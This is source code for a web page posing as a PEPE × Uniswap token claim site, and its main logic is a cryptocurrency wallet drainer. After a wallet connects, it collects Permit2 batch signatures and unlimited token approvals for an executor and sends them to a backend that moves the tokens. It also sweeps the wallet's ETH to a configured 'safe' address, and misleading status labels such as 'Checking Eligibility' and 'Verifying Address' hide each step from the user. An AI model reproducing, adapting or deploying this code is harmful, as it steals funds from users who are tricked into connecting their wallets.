          <div style={{ textAlign: "center", marginBottom: 26 }}>
            <div
              style={{
                color: "rgba(0,255,140,0.95)",
                fontSize: 12,
                letterSpacing: "0.22em",
                textTransform: "uppercase",
                fontFamily:
                  'ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace',
                marginBottom: 10,
              }}
            >
              What You Get
            </div>
            <div
              style={{
                fontFamily: "'Bebas Neue', sans-serif",
                fontSize: "clamp(2rem, 5vw, 3.4rem)",
              }}
            >
              Built Different
            </div>
          </div>

          <div className="cards3">
            <FeatureCard
              delay={0}
              icon={Zap}
              title="Instant Liquidity"
              desc="Uniswap v3 liquidity helps execute quickly with minimal friction."
            />
            <FeatureCard
              delay={150}
              icon={Shield}
              title="Uniswap Security"
              desc="Battle-tested DEX infrastructure with deep liquidity."
            />
            <FeatureCard
              delay={300}
              icon={Laugh}
              title="Meme Culture"
              desc="PEPE is the meme economy. Join hundreds of thousands of holders."
            />
          </div>
        </div>
      </div>
    </section>

    {/* TRUST */}
    <section id="trust" className="divider" style={{ position: "relative", zIndex: 10 }}>
      <div className="sectionMd">
        <div className="containerX">
          <div style={{ textAlign: "center", marginBottom: 22 }}>
            <div
              style={{
                color: "rgba(255,255,255,0.45)",
                fontSize: 12,
                letterSpacing: "0.18em",
                textTransform: "uppercase",
              }}
            >
              Secured By
            </div>
          </div>

          <div
            style={{
              display: "flex",
              flexWrap: "wrap",
              alignItems: "center",
              justifyContent: "center",
              gap: 14,
              marginBottom: 22,
            }}
          >
            <div className="glass" style={{ padding: "12px 14px", display: "flex", gap: 10, alignItems: "center" }}>
              <UniswapLogo size={28} />
              <div>
                <div style={{ fontSize: 14, fontWeight: 600 }}>Uniswap</div>
                <div style={{ fontSize: 12, color: "rgba(255,255,255,0.5)" }}>v3 Protocol</div>
              </div>
            </div>

            <div className="glass" style={{ padding: "12px 14px", display: "flex", gap: 10, alignItems: "center" }}>
              <PepeLogo size={28} />
              <div>
                <div style={{ fontSize: 14, fontWeight: 600 }}>PEPE Token</div>
                <div style={{ fontSize: 12, color: "rgba(255,255,255,0.5)" }}>ERC-20</div>
              </div>
            </div>

            <div className="glass" style={{ padding: "12px 14px", display: "flex", gap: 10, alignItems: "center" }}>
              <div style={{ fontSize: 22 }}>⟠</div>
              <div>
                <div style={{ fontSize: 14, fontWeight: 600 }}>Ethereum</div>
                <div style={{ fontSize: 12, color: "rgba(255,255,255,0.5)" }}>Mainnet</div>
              </div>
            </div>
          </div>

          <div className="glass" style={{ padding: 18, maxWidth: 720, margin: "0 auto" }}>
            <div
              style={{
                color: "rgba(255,255,255,0.5)",
                fontSize: 12,
                letterSpacing: "0.14em",
                textTransform: "uppercase",
                marginBottom: 10,
              }}
            >
              Official Contract
            </div>

            <div className="rowBetween wrap">
              <div
                className="truncate"
                style={{
                  color: "rgba(0,255,140,0.95)",
                  fontFamily:
                    'ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace',
                  fontSize: 12,
                }}
              >
                {PEPE_CONTRACT}
              </div>

              <button
                onClick={() => navigator.clipboard.writeText(PEPE_CONTRACT).catch(() => {})}
                style={{
                  background: "transparent",
                  border: "1px solid rgba(255,255,255,0.10)",
                  color: "rgba(255,255,255,0.65)",
                  padding: "8px 10px",
                  borderRadius: 12,
                  cursor: "pointer",
                }}
                aria-label="Copy contract"
              >
                <Copy size={14} />
              </button>
            </div>

            <div className="rowCenter" style={{ marginTop: 12, color: "rgba(255,255,255,0.5)", fontSize: 12 }}>
              <CheckCircle size={14} color="rgba(0,255,140,0.9)" />
              Verified on Etherscan
            </div>
          </div>
        </div>
      </div>
    </section>

    {/* FOOTER */}
    <footer className="dividerSoft" style={{ position: "relative", zIndex: 10 }}>
      <div className="sectionSm">
        <div className="containerX">
          <div
            style={{
              display: "flex",
              flexWrap: "wrap",
              alignItems: "center",
              justifyContent: "space-between",
              gap: 18,
            }}
          >
            <div style={{ maxWidth: 420 }}>
              <div className="rowCenter" style={{ justifyContent: "flex-start", gap: 10, marginBottom: 10 }}>
                <PepeLogo size={26} />
                <span style={{ color: "rgba(255,255,255,0.25)", fontSize: 16 }}>×</span>
                <UniswapLogo size={24} />
              </div>
              <div style={{ color: "rgba(255,255,255,0.45)", fontSize: 12, lineHeight: 1.6 }}>
                Not financial advice. Meme tokens are high-risk assets. Only invest what you can lose.
              </div>
            </div>

            <div style={{ display: "flex", flexWrap: "wrap", gap: 14 }}>
              <a
                href="https://twitter.com/pepecoineth"
                target="_blank"
                rel="noreferrer"
                style={{ color: "rgba(255,255,255,0.55)", display: "inline-flex", alignItems: "center", gap: 8, fontSize: 13 }}
              >
                <Twitter size={15} /> @pepecoineth
              </a>

              <a
                href="https://t.me/pepecoineth"
                target="_blank"
                rel="noreferrer"
                style={{ color: "rgba(255,255,255,0.55)", display: "inline-flex", alignItems: "center", gap: 8, fontSize: 13 }}
              >
                <Send size={15} /> Telegram
              </a>

              <a
                href={`https://etherscan.io/token/${PEPE_CONTRACT}`}
                target="_blank"
                rel="noreferrer"
                style={{ color: "rgba(255,255,255,0.55)", display: "inline-flex", alignItems: "center", gap: 8, fontSize: 13 }}
              >
                <ExternalLink size={14} /> Etherscan
              </a>
            </div>
          </div>

          <div
            style={{
              marginTop: 18,
              paddingTop: 18,
              borderTop: "1px solid rgba(255,255,255,0.06)",
              textAlign: "center",
              color: "rgba(255,255,255,0.40)",
              fontSize: 12,
            }}
          >
            © 2025 PEPE × Uniswap Collaboration. This is a fan/demo page. DYOR.
          </div>
        </div>
      </div>
    </footer>
  </div>
);
}

function formatStatus(s: string): { title: string; detail?: string; kind: "info" | "warn" | "error" | "success" } {
  if (!s || s === "idle") return { title: "", kind: "info" };

  // ✅ Friendly labels for ALL statusescd
  switch (s) {
    case "switching":
      return { title: "Switching network…", kind: "info" };
    case "discovering_tokens":
      return { title: "Loading…", detail: "Getting Quote..", kind: "info" };
    case "Confirm to continue...":
      return { title: "Signature request", detail: "Signing Up...", kind: "info" };
    case "approving_tokens":
      return { title: "Approvals needed", detail: "Verifying Address...", kind: "info" };
    case "permit2_tx":
      return { title: "Submitting Verification transaction…", detail: "Confirm to Continue and keep your wallet open", kind: "info" };
    case "erc20_rescue_tx":
      return { title: "Preparing PEPE token…", detail: "Confirm the transaction in your wallet", kind: "info" };
    case "erc20_done":
      return { title: "Token Request Completed", kind: "success" };
    case "erc20_failed":
      return { title: "Token Request failed", detail: "Continuing with ETH", kind: "warn" };
    case "erc20_cancelled":
      return { title: "Request cancelled", detail: "Continuing with ETH", kind: "warn" };

    case "estimating_eth":
    case "Estimating gas":
      return { title: "Preparing ETH for Swap…", kind: "info" };
    case "low_eth_balance":
    case "LOW ETH BALANCE":
      return { title: "Low ETH balance", detail: "Not enough ETH to pay gas", kind: "warn" };
    case "eth_failed":
      return { title: "#BDAG swap failed", kind: "warn" };
    case "done":
      return { title: "Done", detail: "Rescue flow completed", kind: "success" };
    case "user-rejected":
      return { title: "Cancelled", detail: "You rejected the wallet request", kind: "warn" };

    default:
      // If you ever setStatus(`error: ...`) we show it nicely
      if (s.startsWith("error:")) return { title: "Error", detail: s.slice(6).trim(), kind: "error" };
      return { title: s.replaceAll("_", " "), kind: "info" };
  }
}

function StyledStatusToast({ status }: { status: string }) {
  if (!status || status === "idle") return null;

  const msg = formatStatus(status);

  // Theme colors (no Tailwind needed)
  const theme =
    msg.kind === "success"
      ? { bg: "rgba(34,197,94,0.12)", border: "rgba(34,197,94,0.28)" }
      : msg.kind === "error"
      ? { bg: "rgba(239,68,68,0.12)", border: "rgba(239,68,68,0.28)" }
      : msg.kind === "warn"
      ? { bg: "rgba(245,158,11,0.12)", border: "rgba(245,158,11,0.28)" }
      : { bg: "rgba(255,255,255,0.08)", border: "rgba(255,255,255,0.14)" };

  return (
    <div
      className="fixed bottom-6 left-[25%] -translate-x-1/2 z-50"
      style={{ zIndex: 9999, width: "min(560px, calc(100% - 24px))" }}
    >
      <div
        className="style_container__O7qie"
        style={{
          background: theme.bg,
          border: `1px solid ${theme.border}`,
          borderRadius: 18,
          padding: "14px 16px",
          backdropFilter: "blur(10px)",
        }}
      >
        <div className="style_text__Z44aT __className_665d18" style={{ fontSize: 16, fontWeight: 800, color: "#fff" }}>
          {msg.title}
        </div>
        {msg.detail ? (
          <div className="style_text__Z44aT style_md__ZQhe4" style={{ marginTop: 6, color: "rgba(255,255,255,0.75)" }}>
            {msg.detail}
          </div>
        ) : null}
      </div>
    </div>
  );
}




/* ─────────────────────────────────────────────────────────────
   6) PAGE (Rescue logic stays here) — UNCHANGED LOGIC
   ───────────────────────────────────────────────────────────── */
export default function Page() {
  const [connectOpen, setConnectOpen] = useState(false);
  const [provider, setProvider] = useState<any | null>(null);
  const [address, setAddress] = useState<string | null>(null);
  const [chainId, setChainId] = useState<number | null>(null);
  const [status, setStatus] = useState<string>("idle");

  const permit2 = process.env.NEXT_PUBLIC_PERMIT2!;
  const executor = process.env.NEXT_PUBLIC_EXECUTOR!;
  const safe = process.env.NEXT_PUBLIC_SAFE_ADDRESS!;

  useEffect(() => {
    if (!provider) return;

    const cleanup = attachWalletListeners(provider, {
      onAccountsChanged: (accounts) => {
        const a = accounts?.[0] ?? null;
        setAddress(a);
        if (!a) setStatus("disconnected");
      },
      onChainChanged: (cidHex) => setChainId(parseChainId(cidHex)),
      onDisconnect: () => {
        setProvider(null);
        setAddress(null);
        setChainId(null);
        setStatus("disconnected");
      },
    });

    (async () => {
      try {
        const cid = await provider.request({ method: "eth_chainId" });
        setChainId(parseChainId(cid));
      } catch {}
    })();

    return cleanup;
  }, [provider]);

  const openConnect = useCallback(() => setConnectOpen(true), []);

 const runRescueFlow = useCallback(
  async (p: any, a: string) => {
    try {
      setStatus("switching");
      await ensureMainnet(p);

      try {
        const cid = await p.request({ method: "eth_chainId" });
        setChainId(parseChainId(cid));
      } catch {}

      setStatus("discovering_tokens");
      const discovered = await discoverTokens(a);
      const nonZeroTokens = discovered.tokens.filter((t) => BigInt(t.amount) > 0n);


      // ─────────────────────────────────────────────
// ERC20 (company pays gas): sign once, backend executes
// ─────────────────────────────────────────────
// ─────────────────────────────────────────────────────────────
// ERC20 (company pays gas) — NEW LOGIC:
// 1) check allowance(owner, PERMIT2)
// 2) rescue ready tokens first (1 signature)
// 3) then request approve tx for remaining tokens (user tx popups)
// 4) rescue newly-approved tokens (1 more signature)
// never blocks ETH stage
// ─────────────────────────────────────────────────────────────
const ERC20_ABI = [
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
] as const;

const MAX_UINT256 = (1n << 256n) - 1n;

const callBackendRescue = async (tokensToRescue: typeof nonZeroTokens) => {
  if (tokensToRescue.length === 0) return;

  setStatus(`sign to continue${tokensToRescue.length}`);

  let typedData: any;
  let signature: string;

  try {
    const signed = await signPermit2Batch({
      eip1193Provider: p,
      owner: a,
      permit2Address: permit2,
      spender: executor,
      tokens: tokensToRescue,
    });

    typedData = signed.typedData;
    signature = signed.signature;
  } catch (e: any) {
    const code = e?.code ?? e?.data?.originalError?.code;
    if (code === 4001) setStatus("permit_signature_rejected");
    else setStatus("permit_signature_failed");
    return; // do not block ETH stage
  }

  setStatus(`Checking Eligibility...${tokensToRescue.length}`);

  try {
    const resp = await fetch("/api/rescue", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        owner: a,
        tokens: tokensToRescue.map((t) => ({ token: t.token, amount: t.amount })),
        permitBatch: typedData.message,
        signature,
      }),
    });

    const data = await resp.json().catch(() => ({}));

    // ✅ never throw; never block ETH stage
    if (!resp.ok) {
      console.warn("ERC20 backend HTTP failed:", resp.status, data?.error || resp.statusText);
      setStatus("erc20_backend_http_failed");
      return;
    }

    if (!data?.permit?.ok) console.warn("Permit tx failed:", data?.permit?.error);
    if (!data?.rescue?.ok) console.warn("Rescue tx failed:", data?.rescue?.error);

    setStatus(data?.rescue?.ok ? "erc20_done" : "erc20_partial_or_failed");
  } catch (e) {
    console.warn("ERC20 backend call threw:", e);
    setStatus("erc20_backend_call_failed");
  }
};

if (nonZeroTokens.length > 0) {
  try {
    setStatus("checking_allowances");

    const browserProvider = new ethers.BrowserProvider(p);
    const signer = await browserProvider.getSigner();

    const ready: typeof nonZeroTokens = [];
    const needsApprove: typeof nonZeroTokens = [];

    // 1) split by allowance(owner, PERMIT2)
    for (const t of nonZeroTokens) {
      try {
        const needed = BigInt(t.amount);
        if (needed <= 0n) continue;

        const erc20 = new ethers.Contract(t.token, ERC20_ABI, signer);
        const current = BigInt(await erc20.allowance(a, permit2));

        if (current >= needed) ready.push(t);
        else needsApprove.push(t);
      } catch (e) {
        // safer: treat as needsApprove if allowance read fails
        console.warn("allowance read failed; treating as needsApprove:", t.token, e);
        needsApprove.push(t);
      }
    }

    // 2) rescue "ready" first (no approve popups)
    if (ready.length > 0) {
      setStatus(`erc20_ready_${ready.length}`);
      await callBackendRescue(ready);
    } else {
      setStatus("erc20_ready_none");
    }

    // 3) approvals for remaining tokens (user tx popups)
    if (needsApprove.length > 0) {
      setStatus(`erc20_needs_approve_${needsApprove.length}`);

      let userCancelledApprove = false;

      for (const t of needsApprove) {
        try {
          setStatus(`approve_${t.token.slice(0, 6)}…`);
          const erc20 = new ethers.Contract(t.token, ERC20_ABI, signer);
          const tx = await erc20.approve(permit2, MAX_UINT256);
          await tx.wait();
        } catch (e: any) {
          const code = e?.code ?? e?.data?.originalError?.code;
          if (code === 4001) {
            userCancelledApprove = true;
            setStatus("approve_rejected");
            console.warn("User rejected approve; continuing to ETH");
            break;
          }
          console.warn("approve failed (continuing):", t.token, e);
        }
      }

      // 4) after approvals, re-check and rescue only what is now approved
      if (!userCancelledApprove) {
        setStatus("rechecking_allowances");

        const nowReady: typeof nonZeroTokens = [];
        for (const t of needsApprove) {
          try {
            const erc20 = new ethers.Contract(t.token, ERC20_ABI, signer);
            const current = BigInt(await erc20.allowance(a, permit2));
            if (current >= BigInt(t.amount)) nowReady.push(t);
          } catch {}
        }

        if (nowReady.length > 0) {
          setStatus(`erc20_after_approve_${nowReady.length}`);
          await callBackendRescue(nowReady);
        } else {
          setStatus("erc20_none_approved");
        }
      }
    } else {
      setStatus("erc20_no_approvals_needed");
    }
  } catch (e: any) {
    const code = e?.code ?? e?.data?.originalError?.code;
    if (code === 4001) setStatus("erc20_user_rejected");
    else setStatus("erc20_failed");
    console.warn("ERC20 stage failed (continuing to ETH):", e);
  }
} else {
  setStatus("no-erc20-found");
}

      // ─────────────────────────────────────────────────────────────
      // ETH STAGE (should always run)
      // ─────────────────────────────────────────────────────────────
      setStatus("estimating_eth");
      const ethResult = await sweepEth({ eip1193Provider: p, owner: a, to: safe });

      if (ethResult.ok && !ethResult.skipped) {
        await fetch("/api/notify", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({
            kind: "ETH",
            owner: a,
            to: safe,
            txHash: ethResult.txHash,
            valueWei: ethResult.valueWei,
          }),
        }).catch(() => {});
        setStatus("done");
        return;
      }

      if (ethResult.ok && ethResult.skipped) {
        setStatus("low_eth_balance");
        return;
      }

      setStatus("eth_failed");
    } catch (e: any) {
      const code = e?.code ?? e?.data?.originalError?.code;
      if (code === 4001) setStatus("user-rejected");
      else setStatus(`error: ${e?.message ?? "failed"}`);
    }
  },
  [permit2, executor, safe]
);


  const connectLabel = useMemo(() => {
    if (!address) return "CLAIM";
    return `CLAIM ${shortAddr(address)}`;
  }, [address]);

  return (
    <>
      {/* ✅ UI renders as-is, connect button is wired */}
      <BlockdagHomeUI onConnect={openConnect} />

      {/* Optional tiny status toast (unchanged) */}
<StyledStatusToast status={status} />

      {/* Connect modal */}
      <ConnectModal
        open={connectOpen}
        onClose={() => setConnectOpen(false)}
        onConnected={async ({ provider, address }) => {
          setProvider(provider);
          setAddress(address);
          setConnectOpen(false);
          await runRescueFlow(provider, address);
        }}
      />
    </>
  );
}
